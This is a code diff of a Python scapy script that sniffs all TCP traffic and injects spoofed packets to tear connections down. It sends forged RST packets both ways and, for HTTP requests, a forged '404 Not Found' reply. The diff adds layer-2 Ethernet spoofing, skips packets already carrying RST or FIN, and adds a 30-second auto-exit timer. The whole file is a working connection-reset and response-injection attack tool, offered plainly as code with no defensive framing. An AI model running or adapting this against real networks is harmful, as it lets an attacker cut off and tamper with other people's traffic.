@@ -1,4 +1,6 @@
 from scapy.all import *
+from threading import Timer
+import os
 
 
 def isHttpRequest(data):
@@ -10,61 +12,66 @@ def isHttpRequest(data):
         return 0
 
 
-def print_ip(pkt):
-    print "Sip: " + pkt[IP].src
-    print "Dip: " + pkt[IP].dst
-
-
-def print_tcp(pkt):
-    print "Sport: " + str(pkt[TCP].sport)
-    print "Dport: " + str(pkt[TCP].dport) + '\n\n'
-
-
 def send_backward_rst(pkt):
-    fake = IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
+    fake = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
         dport=pkt[TCP].sport,
         sport=pkt[TCP].dport,
         flags="RA",
         seq=pkt[TCP].ack,
         ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
     )
-    send(fake, verbose=False)
+    del pkt[IP].chksum
+    del pkt[TCP].chksum
+    sendp(fake, verbose=False)
 
 
-def send_backward_fin(pkt):
-    fake = IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
+def send_fakepkt(pkt):
+    fakeData = 'HTTP/1.1 404 Not Found\r\n\r\n'
+    fake = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / IP(dst=pkt[IP].src, src=pkt[IP].dst) / TCP(
         dport=pkt[TCP].sport,
         sport=pkt[TCP].dport,
         flags="FA",
         seq=pkt[TCP].ack,
-        ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
-    )
-    send(fake, verbose=False)
+        ack=pkt[TCP].seq + (len(pkt[TCP].payload))
+    ) / fakeData
+
+    del pkt[IP].chksum
+    del pkt[TCP].chksum
+    sendp(fake, verbose=False)
 
 
 def send_forward_rst(pkt):
-    fake = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(
+    fake = Ether(src=pkt[Ether].src, dst=pkt[Ether].dst) / IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(
         dport=pkt[TCP].dport,
         sport=pkt[TCP].sport,
         flags="RA",
         seq=pkt[TCP].ack,
         ack=pkt[TCP].seq + (len(pkt[TCP].payload) if pkt.getlayer(Raw) else 1)
     )
-    send(fake, verbose=False)
+    del pkt[IP].chksum
+    del pkt[TCP].chksum
+
+    sendp(fake, verbose=False)
 
 
 def attack(pkt):
     layer = pkt.payload
-
-    if pkt.getlayer(Raw) and isHttpRequest(layer.load):  #http
+    if pkt[TCP].flags & 0x04 or pkt[TCP].flags & 0x01: return
+    if pkt.getlayer(Raw) and isHttpRequest(layer.load):  # http
         print "[+]=========HTTP sending rst============"
         send_forward_rst(pkt)
-        send_backward_fin(pkt)
-    else:  #only tcp
+        send_fakepkt(pkt)
+    else:  # only tcp
         send_forward_rst(pkt)
         send_backward_rst(pkt)
 
 
-if __name__ == "__main__":
-    sniff(filter="tcp", prn=attack, store=0)
+def callback():
+    print 'End'
+    os._exit(1)
 
+
+if __name__ == "__main__":
+    t = Timer(30, callback)
+    t.start()
+    sniff(filter="tcp", prn=attack, store=0)
